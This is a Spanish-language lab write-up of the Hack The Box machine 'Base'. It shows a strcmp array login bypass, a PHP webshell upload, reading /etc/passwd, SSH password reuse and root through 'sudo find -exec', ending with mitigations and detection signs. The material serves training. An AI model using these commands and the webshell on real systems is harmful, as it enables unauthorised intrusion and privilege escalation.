---
machine: Base
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [web, type-juggling, upload, sudo, tier2]
---

# Base — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

`login.php` usa `strcmp()` con arrays: enviar `username[]=admin` hace que la comparación devuelva `0` y el login se salta. Un `upload.php` sin validación da webshell, `/etc/passwd` revela el usuario `john` y su contraseña se reutiliza por SSH. `sudo find` cierra con root.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp open ssh  OpenSSH 8.2p1 Ubuntu
80/tcp open http Apache httpd 2.4.41 (Ubuntu)
```

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

```text
/login/login.php
/login.php.swp
/upload.php
/config.php
```

El fichero `.swp` de Vim es recuperable: contiene el código de `login.php` y confirma el uso de `strcmp`.

## Foothold

```bash
curl -s -X POST http://<TARGET_IP>/login/login.php \
  -d 'username[]=admin&password[]=x'
```

`strcmp(array, string)` devuelve `NULL`/`0` y PHP lo interpreta como igualdad → sesión iniciada. El panel redirige a `upload.php`, que acepta cualquier fichero:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -s -b 'PHPSESSID=<SESION>' -F 'file=@shell.php' http://<TARGET_IP>/upload.php
curl -s "http://<TARGET_IP>/uploads/shell.php?c=id"
```

## Movimiento lateral

```bash
curl -s "http://<TARGET_IP>/uploads/shell.php?c=cat+/etc/passwd"
```

Del listado sale `john`; su contraseña está en `config.php` y se reutiliza en SSH:

```bash
ssh john@<TARGET_IP>
```

## Escalada de privilegios

```bash
sudo -l
# (root) /usr/bin/find
sudo /usr/bin/find /bin -exec /bin/bash \;
```

```text
# id
uid=0(root)
# cat /root/root.txt
```

## Evidencia

- Petición con `username[]` y panel autenticado.
- `sudo -l` con la regla de `find` y shell de root.

## Lecciones aprendidas

- `strcmp` con tipos no string es un bypass clásico: los arrays rompen la comparación.
- Un `.swp` olvidado equivale a publicar el código fuente.
- Subidas sin validación de extensión ni de ejecución → webshell.
- `find` con `-exec` bajo `sudo` es root; también lo son `less`, `awk`, `nano`.

## Mitigaciones y detección

- Comparaciones con `hash_equals()` y tipado estricto (`declare(strict_types=1)`).
- Validar que los parámetros sean escalares antes de usarlos.
- Subidas fuera del webroot, renombradas y sin ejecución; comprobar MIME real.
- `sudo` sin `find`/editores/paginadores; usar `sudoedit` con listas.
- Detección: `username[]` en POST, `.swp` accesibles, `find -exec` con `bash` en `auth.log`.

- CWE-843 Type Confusion, CWE-434, CWE-250
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/)

## Referencias

- [OWASP — PHP type juggling](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
